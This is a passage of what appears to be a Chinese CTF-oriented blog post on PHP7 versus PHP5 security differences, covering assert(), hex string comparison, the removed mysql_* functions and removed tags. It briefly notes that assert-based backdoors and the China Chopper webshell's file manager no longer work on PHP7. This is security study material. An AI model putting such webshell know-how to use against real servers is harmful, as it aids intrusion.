+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="mysql_系列全员移除" class="headerLink">
+    <a href="#mysql_%e7%b3%bb%e5%88%97%e5%85%a8%e5%91%98%e7%a7%bb%e9%99%a4" class="header-mark"></a>mysql_*系列全员移除</h4><p>如果要在PHP7上面用老版本的mysql_*系列函数就需要你自己去额外装了，官方不在自带，现在官方推荐的是mysqli或者pdo_mysql。这是否预示着未来SQL注入漏洞在PHP上的大幅减少呢~</p>
+<h4 id="assert默认不在可以执行代码" class="headerLink">
+    <a href="#assert%e9%bb%98%e8%ae%a4%e4%b8%8d%e5%9c%a8%e5%8f%af%e4%bb%a5%e6%89%a7%e8%a1%8c%e4%bb%a3%e7%a0%81" class="header-mark"></a>assert()默认不在可以执行代码</h4><p>这意味着大部分的后门都不可以使用，同时菜刀的文件管理器也是使用assert，导致菜刀没办法在PHP7上正常使用</p>
+<h4 id="十六进制字符串不再被认为是数字" class="headerLink">
+    <a href="#%e5%8d%81%e5%85%ad%e8%bf%9b%e5%88%b6%e5%ad%97%e7%ac%a6%e4%b8%b2%e4%b8%8d%e5%86%8d%e8%a2%ab%e8%ae%a4%e4%b8%ba%e6%98%af%e6%95%b0%e5%ad%97" class="header-mark"></a>十六进制字符串不再被认为是数字</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//PHP7
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">var_dump</span><span class="p">(</span><span class="s2">&#34;0x123&#34;</span> <span class="o">==</span> <span class="s2">&#34;291&#34;</span><span class="p">);</span> <span class="c1">//bool(false) 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">var_dump</span><span class="p">(</span><span class="nx">is_numeric</span><span class="p">(</span><span class="s2">&#34;0x123&#34;</span><span class="p">));</span><span class="c1">//bool(false) 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">var_dump</span><span class="p">(</span><span class="s2">&#34;0xe&#34;</span> <span class="o">+</span> <span class="s2">&#34;0x1&#34;</span><span class="p">);</span> <span class="c1">// int(0) 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">var_dump</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="s2">&#34;foo&#34;</span><span class="p">,</span> <span class="s2">&#34;0x1&#34;</span><span class="p">));</span><span class="c1">// string(3) &#34;foo&#34; 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="移除了-asp-和-script-php-标签" class="headerLink">
+    <a href="#%e7%a7%bb%e9%99%a4%e4%ba%86-asp-%e5%92%8c-script-php-%e6%a0%87%e7%ad%be" class="header-mark"></a>移除了 ASP 和 script PHP 标签</h4><p><code>&lt;% %&gt;</code>、<code>&lt;%= %&gt;</code>、<code>&lt;script language=&quot;php&quot;&gt; &lt;/script&gt;</code>被移除，现在PHP7只有<code>&lt;?php ?&gt;</code>和<code>&lt;?= ?&gt;</code>标签可以使用</p>
+<h4 id="超大浮点数类型转换截断" class="headerLink">
+    <a href="#%e8%b6%85%e5%a4%a7%e6%b5%ae%e7%82%b9%e6%95%b0%e7%b1%bb%e5%9e%8b%e8%bd%ac%e6%8d%a2%e6%88%aa%e6%96%ad" class="header-mark"></a>超大浮点数类型转换截断</h4><p>将浮点数转换为整数的时候，如果浮点数值太大，导致无法以整数表达的情况下， 在PHP5的版本中，转换会直接将整数截断，并不会引发错误。 在PHP7中，会报错。</p>
+<br/>
+<h2 id="参考" class="headerLink">
+    <a href="#%e5%8f%82%e8%80%83" class="header-mark"></a>参考</h2><p><a href="https://www.restran.net/2016/09/26/php-security-notes/" target="_blank" rel="noopener noreffer"> CTF 中的 PHP 知识汇总 </a>
+<a href="https://www.cnblogs.com/r00tuser/p/10528864.html" target="_blank" rel="noopener noreffer">PHP7和PHP5在安全上的区别[更新]</a></p>
+</div>
+
+        <div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2020-10-13</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/%E5%8F%8D%E5%BC%B9shell/" class="prev" rel="prev" title="反弹shell"><i class="fas fa-angle-left fa-fw"></i>反弹shell</a>
+            <a href="/pwnenvironment/" class="next" rel="next" title="Pwn环境搭建">Pwn环境搭建<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                    由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.96.0">Hugo</a> 强力驱动&nbsp;|&nbsp;主题 - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreffer" title="DoIt 0.2.13"><i class="far fa-edit fa-fw"></i> DoIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer">高诺琪</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="回到顶部">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/fuse/fuse.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/topbar/topbar.min.js"></script><script type="text/javascript" src="/lib/pjax/pjax.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script></div>
+
+<div class="pjax-assets"><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/index.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":true,"location":0,"maxResultLength":6,"minMatchCharLength":2,"noResultsFound":"没有找到结果","snippetLength":10,"threshold":0.3,"type":"fuse","useExtendedSearch":false},"table":{"sort":true}};</script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js" defer></script><script type="text/javascript" src="/lib/katex/auto-render.min.js" defer></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js" defer></script><script type="text/javascript" src="/lib/katex/mhchem.min.js" defer></script><script type="text/javascript" src="/js/katex.min.js" defer></script><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/katex/copy-tex.min.css">
+        <noscript><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"></noscript></div>
+</body>
+
+</html>
